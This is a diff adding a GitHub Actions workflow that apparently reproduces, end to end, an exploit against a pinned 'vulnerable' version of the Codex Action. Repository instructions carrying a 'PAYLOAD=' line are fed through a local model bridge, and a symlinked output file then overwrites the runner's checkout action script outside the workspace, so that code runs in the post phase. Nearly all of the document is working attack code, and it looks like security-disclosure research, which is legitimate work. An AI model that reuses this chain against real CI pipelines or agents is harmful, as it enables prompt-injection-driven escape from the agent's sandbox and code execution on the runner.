@@ -1,0 +1,237 @@
+name: Codex Action symlink E2E
+
+on:
+  pull_request_target:
+    types: [opened, synchronize, reopened]
+
+permissions:
+  contents: write
+  models: read
+  pull-requests: write
+
+concurrency:
+  group: codex-action-symlink-e2e-${{ github.event.pull_request.number }}
+  cancel-in-progress: true
+
+jobs:
+  reproduce:
+    if: >-
+      github.repository == 'BigTankBoy/websiteeeee' &&
+      github.actor == 'BigTankBoy' &&
+      startsWith(github.event.pull_request.head.ref, 'codex-symlink-e2e-')
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+
+    steps:
+      - name: Checkout attacker-controlled head
+        uses: actions/checkout@v5
+        with:
+          repository: ${{ github.event.pull_request.head.repo.full_name }}
+          ref: ${{ github.event.pull_request.head.sha }}
+          persist-credentials: false
+
+      - name: Record event and checkout facts
+        env:
+          EXPECTED_HEAD: ${{ github.event.pull_request.head.sha }}
+        run: |
+          set -euo pipefail
+          echo "event_name=$GITHUB_EVENT_NAME"
+          echo "actor=$GITHUB_ACTOR"
+          echo "base_repository=$GITHUB_REPOSITORY"
+          echo "head_repository=${{ github.event.pull_request.head.repo.full_name }}"
+          echo "head_sha=$EXPECTED_HEAD"
+          test "$(git rev-parse HEAD)" = "$EXPECTED_HEAD"
+          git ls-files --stage codex-output.md
+          test "$(git ls-files --stage codex-output.md | awk '{print $1}')" = "120000"
+          echo "output_link=$(readlink codex-output.md)"
+
+      - name: Start Responses API to GitHub Models bridge
+        env:
+          BRIDGE_PORT: "18080"
+        run: |
+          set -euo pipefail
+          cat >"$RUNNER_TEMP/responses-bridge.mjs" <<'NODE'
+          import http from "node:http";
+
+          const port = Number(process.env.BRIDGE_PORT || "18080");
+
+          function collectStrings(value, out = []) {
+            if (typeof value === "string") {
+              out.push(value);
+            } else if (Array.isArray(value)) {
+              for (const item of value) collectStrings(item, out);
+            } else if (value && typeof value === "object") {
+              for (const item of Object.values(value)) collectStrings(item, out);
+            }
+            return out;
+          }
+
+          function sendJson(res, status, value) {
+            const body = JSON.stringify(value);
+            res.writeHead(status, {
+              "content-type": "application/json",
+              "content-length": Buffer.byteLength(body),
+            });
+            res.end(body);
+          }
+
+          const server = http.createServer(async (req, res) => {
+            if (req.method === "GET" && req.url === "/health") {
+              return sendJson(res, 200, { ok: true });
+            }
+            if (req.method !== "POST" || req.url !== "/v1/responses") {
+              return sendJson(res, 404, { error: "not found" });
+            }
+
+            try {
+              const chunks = [];
+              for await (const chunk of req) chunks.push(chunk);
+              const request = JSON.parse(Buffer.concat(chunks).toString("utf8"));
+              const strings = collectStrings(request);
+              const repositoryInstruction = strings.find((value) =>
+                value.includes("PAYLOAD=") &&
+                value.includes("POST_ACTION_NATURAL_EXECUTION")
+              );
+              if (!repositoryInstruction) {
+                console.log("BRIDGE_REPOSITORY_PAYLOAD_SEEN=false");
+                return sendJson(res, 400, {
+                  error: "repository payload instruction was not present",
+                });
+              }
+              console.log("BRIDGE_REPOSITORY_PAYLOAD_SEEN=true");
+
+              const authorization = req.headers.authorization;
+              if (!authorization?.startsWith("Bearer ")) {
+                return sendJson(res, 401, { error: "missing bearer token" });
+              }
+
+              const modelResponse = await fetch(
+                "https://models.github.ai/inference/chat/completions",
+                {
+                  method: "POST",
+                  headers: {
+                    authorization,
+                    "content-type": "application/json",
+                    accept: "application/vnd.github+json",
+                    "x-github-api-version": "2026-03-10",
+                  },
+                  body: JSON.stringify({
+                    model: "openai/gpt-4.1",
+                    temperature: 0,
+                    messages: [
+                      {
+                        role: "system",
+                        content:
+                          "Return exactly the characters following PAYLOAD= on " +
+                          "that line. Do not use Markdown fences or add text.",
+                      },
+                      { role: "user", content: repositoryInstruction },
+                    ],
+                  }),
+                }
+              );
+              const modelBody = await modelResponse.text();
+              if (!modelResponse.ok) {
+                console.log(`BRIDGE_MODEL_STATUS=${modelResponse.status}`);
+                return sendJson(res, 502, { error: "model request failed" });
+              }
+              const parsed = JSON.parse(modelBody);
+              const text = parsed.choices?.[0]?.message?.content;
+              if (typeof text !== "string" || text.length === 0) {
+                return sendJson(res, 502, { error: "model returned no text" });
+              }
+              console.log("BRIDGE_MODEL_STATUS=200");
+
+              const responseId = `resp_${Date.now()}`;
+              const events = [
+                {
+                  type: "response.created",
+                  response: { id: responseId },
+                },
+                {
+                  type: "response.output_item.done",
+                  item: {
+                    type: "message",
+                    role: "assistant",
+                    id: `msg_${Date.now()}`,
+                    content: [{ type: "output_text", text }],
+                  },
+                },
+                {
+                  type: "response.completed",
+                  response: {
+                    id: responseId,
+                    usage: {
+                      input_tokens: 0,
+                      input_tokens_details: null,
+                      output_tokens: 0,
+                      output_tokens_details: null,
+                      total_tokens: 0,
+                    },
+                  },
+                },
+              ];
+
+              res.writeHead(200, {
+                "content-type": "text/event-stream",
+                "cache-control": "no-cache",
+                connection: "keep-alive",
+              });
+              for (const event of events) {
+                res.write(`event: ${event.type}\n`);
+                res.write(`data: ${JSON.stringify(event)}\n\n`);
+              }
+              res.end();
+            } catch (error) {
+              console.error("BRIDGE_ERROR", error?.message || String(error));
+              if (!res.headersSent) {
+                sendJson(res, 500, { error: "bridge failure" });
+              } else {
+                res.end();
+              }
+            }
+          });
+
+          server.listen(port, "127.0.0.1", () => {
+            console.log(`BRIDGE_READY=${port}`);
+          });
+          NODE
+
+          node "$RUNNER_TEMP/responses-bridge.mjs" \
+            >"$RUNNER_TEMP/responses-bridge.log" 2>&1 &
+          echo "$!" >"$RUNNER_TEMP/responses-bridge.pid"
+          for _ in $(seq 1 30); do
+            if curl -fsS "http://127.0.0.1:${BRIDGE_PORT}/health" >/dev/null; then
+              exit 0
+            fi
+            sleep 1
+          done
+          cat "$RUNNER_TEMP/responses-bridge.log"
+          exit 1
+
+      - name: Run vulnerable Codex Action
+        uses: openai/codex-action@52fe01ec70a42f454c9d2ebd47598f9fd6893d56
+        with:
+          openai-api-key: ${{ github.token }}
+          responses-api-endpoint: http://127.0.0.1:18080/v1/responses
+          prompt: >-
+            Inspect the checkout and provide exactly the final response required
+            by the repository instructions.
+          output-file: codex-output.md
+          permission-profile: ":workspace"
+          safety-strategy: drop-sudo
+          allow-users: "*"
+          codex-version: 0.144.6
+          model: gpt-4.1
+          effort: low
+
+      - name: Verify host-side overwrite before runner post phase
+        run: |
+          set -euo pipefail
+          target="$RUNNER_WORKSPACE/_actions/actions/checkout/v5/dist/index.js"
+          test -f "$target"
+          grep -q "POST_ACTION_NATURAL_EXECUTION" "$target"
+          echo "HOST_SIDE_OUTSIDE_WORKSPACE_OVERWRITE=true"
+          echo "overwritten_target=$target"
+          echo "workspace=$GITHUB_WORKSPACE"
+          cat "$RUNNER_TEMP/responses-bridge.log"
